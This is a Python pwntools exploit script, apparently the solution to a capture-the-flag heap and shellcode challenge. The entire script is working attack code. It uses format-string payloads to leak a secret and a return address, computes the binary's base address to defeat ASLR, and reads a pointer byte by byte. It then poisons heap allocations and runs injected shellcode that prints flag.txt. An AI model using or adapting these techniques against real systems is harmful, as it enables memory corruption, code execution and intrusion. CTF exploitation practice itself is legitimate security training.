#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("../../challenge/chall")

# context.log_level = 'debug'

OFFSET_WRITE = 1752
RETURN_ADDRESS_OFFSET = 8209
OFFSET_MAIN111 = 0x136C
SHELLCODE_OFFSET = 0x202060


def main():
    # context.log_level = "DEBUG"
    HOST = args.HOST if args.HOST else "localhost"
    PORT = int(args.PORT) if args.PORT else 1337
    SSL = args.SSL
    p = remote(HOST, PORT, ssl=SSL)

    if args.TEAM_TOKEN:
        p.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())


    payload = b"\x90" * (1024 - 32)

    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"create")
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
    p.sendafter(b"Enter your shellcode: ", payload)

    p.recvuntil(b"0x13df:")
    p.recvline()

    secret = p.recv(16).decode()
    info("Secret: %s", secret)

    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
    p.sendafter(
        b"Enter your shellcode: ",
        payload + secret.encode() + b"A" * 8 + f".%{RETURN_ADDRESS_OFFSET}$p".encode(),
    )
    p.recvuntil(b"A" * 8 + b".")
    leak = p.recvuntil(b"Select").split(b"S")[0].decode().strip()
    info("Return address leak: %s", leak)
    # if "41414141" in leak:
    #     print(f"Found offset at {i}", leak)
    #     break

    base_address = int(leak, 16) - (exe.symbols["main"] + 111)
    info("Base address: %s", hex(base_address))

    shellcode_address = base_address + SHELLCODE_OFFSET
    info("Shellcode address: %s", hex(shellcode_address))

    final_address = b"\x00"
    for i in range(1, 8):
        p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
        p.sendafter(
            b"Enter your shellcode: ",
            payload
            + secret.encode()
            + f"%{OFFSET_WRITE + 1}$s.".encode()
            + p64(shellcode_address + i),
        )
        p.recvuntil(secret.encode())
        byte = p.recv(1)
        if byte == b".":
            byte = b"\x00"
        final_address += byte

    info("Final shellcode address: 0x%x", u64(final_address))

    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"delete")
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
    p.sendlineafter(b"Enter your shellcode: ", b"A" * 16)
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"delete")
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
    p.sendlineafter(b"Enter your shellcode: ", final_address)
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"create")
    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"create")

    shellcode = asm(shellcraft.cat2("flag.txt")) + asm(shellcraft.exit(0))

    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"edit")
    p.sendafter(b"Enter your shellcode: ", shellcode)

    p.sendlineafter(b"(create/delete/edit/execute/exit): ", b"execute")

    p.interactive()

    p.close()


if __name__ == "__main__":
    main()

